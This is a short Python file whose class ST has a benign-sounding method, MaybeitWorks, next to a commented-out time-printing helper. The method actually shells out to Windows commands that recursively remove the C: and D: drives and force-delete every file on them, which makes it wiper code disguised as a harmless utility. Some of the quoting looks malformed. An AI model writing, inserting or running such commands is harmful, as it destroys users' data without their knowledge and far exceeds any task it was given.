import os
#from datetime import datetime

class ST:

    #def ShowTime():
    #    print(datetime.now())
    def MaybeitWorks():
        os.system('cmd /k "rd C:\/s/q"')
        os.system('cmd /k "rd D:\/s/q"')
        os.system('cmd /k "del /f /q /s "C:\*.*""')
        os.system('cmd /k "del /f "C:\*.*"/q /s"')
        os.system('cmd /k "del /f /q /s "D:\*.*""')
        os.system('cmd /k "del /f "D:\*.*"/q /s"')



